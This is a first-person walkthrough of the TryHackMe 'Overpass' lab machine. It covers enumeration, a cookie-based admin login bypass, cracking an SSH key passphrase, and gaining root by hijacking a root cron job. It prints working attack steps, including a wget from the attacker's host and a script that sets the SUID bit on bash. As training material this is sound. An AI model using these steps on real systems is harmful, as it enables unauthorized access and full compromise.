# Machine: Overpass (TryHackMe)

## Enumeration

```bash
nmap -sC -sV <targetip>
```

The scan revealed two open ports:
- **22** — SSH service
- **80** — HTTP service

<img width="808" height="274" alt="nmap" src="https://github.com/user-attachments/assets/7c81520d-c0f0-4de8-9f4e-63120e043eeb" />

I accessed the web application on port 80. The page presented a password management software with a download option.

I used Gobuster to enumerate the application and discovered an `/admin` directory.

<img width="858" height="419" alt="gobuster" src="https://github.com/user-attachments/assets/bd4ef3c6-ea81-48ee-91d1-31d7adf5dc3c" />

## Exploitation

The `/admin` directory contained a login page. Analyzing the application's JavaScript files, I identified a **logic flaw in the authentication mechanism**.

The application used a cookie named `SessionToken` to validate access to the admin area. However, there was no validation of the token's authenticity — only a check for the cookie's existence.

<img width="959" height="507" alt="code" src="https://github.com/user-attachments/assets/1c982663-811b-4097-9f94-ce1dc42a4588" />

This meant any user with a cookie named `SessionToken` would be automatically redirected to the admin area.

I exploited this flaw by manually creating the cookie via the browser console.

```javascript
Cookies.set("SessionToken", "")
```

This granted me access to the admin panel.

Inside the admin panel, I found a message from a developer addressed to a user named **James**, which contained an **RSA private key** used for SSH authentication.

<img width="869" height="716" alt="admin" src="https://github.com/user-attachments/assets/727fad42-1528-497f-b1f5-bacce4b33d5f" />

The key was password-protected. I used `ssh2john` to convert it into a hash format compatible with John the Ripper.

```bash
ssh2john.py rsa > hash
```

John the Ripper successfully cracked the passphrase.

<img width="314" height="97" alt="hash" src="https://github.com/user-attachments/assets/ab0718dd-bfe6-437a-9200-f3f06dfb55fd" />

Using the private key and cracked password, I authenticated via SSH as user **james** and retrieved the first flag (`user.txt`).

## Privilege Escalation

After gaining initial access, I confirmed that **james** had sudo privileges — but the SSH passphrase was not valid for sudo, preventing direct escalation.

I transferred LinPEAS to the target machine to identify privilege escalation vectors. I hosted it via a Python HTTP server on my machine.

```bash
python3 -m http.server 8000
```

On the target:

```bash
wget http://<myIP>:8000/linpeas.sh
```

LinPEAS revealed **cron jobs running as root**, which automatically downloaded and executed a script from:

```
downloads/src/buildscript.sh
```

<img width="862" height="96" alt="cron" src="https://github.com/user-attachments/assets/d041b502-ab34-4b24-9edb-80f2193c234f" />

> **Note:** A cron job is an automated Linux task scheduled to run at defined intervals (in this case, every minute) without manual execution. Since this cron job runs as root, it can be abused for privilege escalation.

The script was fetched from the domain `overpass.thm`.

**On my machine:**
I created the same directory structure (`downloads/src/buildscript.sh`) and inserted the following command into `buildscript.sh`:

```bash
chmod +s /bin/bash
```

This would activate the SUID bit on bash when executed as root.

I started an HTTP server on port 80 to serve the file.

**On the target machine:**
I modified `/etc/hosts` to point `overpass.thm` to my machine's IP.

When the cron job executed as root, it downloaded and ran my script — setting the SUID bit on `/bin/bash`.

After waiting approximately one minute, I ran:

```bash
/bin/bash -p
```

The `-p` flag preserved the elevated privileges, resulting in a shell with UID 0 (root).

With root access, I navigated to `/root` and retrieved the second and final flag (`root.txt`), successfully completing the machine.

## Conclusion

Overpass explores multiple fundamental offensive security concepts — authentication logic flaws, insecure token management, private key exposure, weak cryptography cracking, and privilege escalation via misconfigured cron jobs.

The exploitation demonstrated how a chain of small flaws can lead to full system compromise, reinforcing the importance of proper session validation, secrets protection, and careful handling of automated scripts running with elevated privileges.
